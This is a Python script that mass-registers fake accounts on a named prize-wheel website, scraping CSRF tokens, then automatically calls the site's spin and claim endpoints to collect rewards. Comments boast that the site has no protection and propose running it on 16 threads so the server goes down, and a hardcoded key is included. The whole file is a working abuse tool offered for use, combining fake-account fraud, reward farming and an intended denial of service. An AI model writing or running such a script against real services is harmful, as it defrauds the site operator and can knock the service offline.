import requests
from bs4 import BeautifulSoup
from faker import Faker
import time

fake = Faker()

spinurl = "https://furywheel.me/dashboard/spin"
claimurl = "https://furywheel.me/dashboard/claim"
hardcodedkey = "n4zGMvTV7GM5ipzA1p8HtNjIGuq3iy9ttlHbiuCk" #????

def main(): # make this async and while true on 16 threads and server go boom
    for i in range(2):
        session = requests.Session()

        response = session.get("https://furywheel.me/register")
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "_token"})["value"]

        password = fake.password(length=10)
        user = fake.user_name()
        payload = {
            "_token": csrf_token,
            "name": user,
            "email": fake.email(),
            "password": password,
            "password_confirmation": password
        }

        post_response = session.post("https://furywheel.me/register", data=payload)

        print(f"Details {user},{password}")

        print(f"Request {i+1}: {post_response.status_code}") # 200 , 200 (as of 01/09/2025) no auth thats very bad

        response = session.get(f"{"https://furywheel.me"}/dashboard")
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token_tag = soup.find("meta", {"name": "csrf-token"})
        csrf_token = csrf_token_tag["content"] if csrf_token_tag else "123abc"

        headers = {
            "X-CSRF-TOKEN": csrf_token,
            "X-Request-ID": str(int(time.time() * 1000))
        }

        response = session.post(spinurl, headers=headers)

        try:
            print(response.json())
        except ValueError:
            print("Response not JSON:", response.text) # good

        response = session.get(f"{"https://furywheel.me"}/dashboard")
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token_tag = soup.find("meta", {"name": "csrf-token"})
        csrf_token = csrf_token_tag["content"] if csrf_token_tag else "123abc"

        headers = {
            "X-CSRF-TOKEN" : csrf_token
        }
        data = {
            "inventory_id" : 51
        }

        response = session.post(claimurl, headers=headers,data=data)

        try:
            print(response.json())
        except ValueError:
            print("Response not JSON:", response.text) # good

        session.close()

    input() 

if __name__ == "__main__":
    main()

